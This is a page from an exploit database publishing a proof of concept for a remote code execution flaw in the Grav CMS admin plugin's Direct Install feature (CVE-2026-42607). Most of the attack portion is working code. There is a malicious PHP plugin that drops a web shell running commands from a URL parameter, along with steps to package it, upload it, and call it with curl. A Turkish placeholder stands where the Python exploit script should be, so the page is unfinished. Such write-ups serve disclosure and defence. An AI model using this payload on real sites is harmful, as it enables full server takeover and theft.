---
title: Grav CMS 2.0.0-beta.2  Remote Code Execution
url: https://cxsecurity.com/issue/WLB-2026050021
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-05-27
fetch_date: 2026-05-28T06:01:05.310656
---

# Grav CMS 2.0.0-beta.2  Remote Code Execution

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Grav CMS 2.0.0-beta.2 Remote Code Execution** **2026.05.27**  Credit:  **[Mustafa Murat Akgül](https://cxsecurity.com/author/Mustafa%2BMurat%2BAkg%C3%BCl/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2026-42607](https://cxsecurity.com/cveshow/CVE-2026-42607/ "Click to see CVE-2026-42607")**  CWE: **N/A** | |

# Exploit Title: Grav CMS < 2.0.0-beta.2 - Remote Code Execution (RCE)
# Date: 2026-05-08
# Exploit Author: Mustafa Murat Akgül
# Vendor Homepage: https://getgrav.org/
# Software Link: https://github.com/getgrav/grav
# Version: < 2.0.0-beta.2
# CVE: CVE-2026-42607 / GHSA-w48r-jppp-rcfw
# Tested on: Linux/Ubuntu (Grav Admin Plugin Enabled)
Technical Details:
The Grav CMS "Direct Install" feature in the Admin plugin allows administrators
to upload plugins as ZIP files. The system failed to adequately validate the
contents of the ZIP archive or prevent path traversal (Zip Slip) during extraction.
By crafting a malicious plugin that hooks into Grav events (e.g., onPluginsInitialized),
an attacker can execute arbitrary PHP code or drop a persistent web shell on the root directory.
Proof of Concept (PoC):
1. Create a malicious plugin structure:
- shellplugin/blueprints.yaml
- shellplugin/shellplugin.yaml
- shellplugin/shellplugin.php (Payload below)
--- shellplugin.php ---
<?php
namespace Grav\Plugin;
use Grav\Common\Plugin;
class ShellpluginPlugin extends Plugin {
public static function getSubscribedEvents(): array {
return ['onPluginsInitialized' => ['onPluginsInitialized', 0]];
}
public function onPluginsInitialized(): void {
$shell\_path = GRAV\_ROOT . '/shell.php';
if (!file\_exists($shell\_path)) {
file\_put\_contents($shell\_path, '<?php system($\_GET["cmd"]); ?>');
}
}
}
----------------------
2. Compress the directory:
$ zip -r shellplugin.zip shellplugin/
3. Log in to the Grav Admin panel and navigate to:
/admin/tools/direct-install
4. Upload the 'shellplugin.zip' file.
5. Once installed, the plugin triggers on the next request to the site,
dropping a shell at the root.
6. Access your shell:
curl "http://<target>/shell.php?cmd=id"
Exploit Script (Python):
[Buraya yukarıda paylaştığın Python scriptini ekleyebilirsin]
Impact:
Full system-level access under the context of the web server user. An attacker
with administrative privileges (or via CSRF) can compromise the entire server.

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2026050021)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2026**, cxsecurity.com

|  |

Back to Top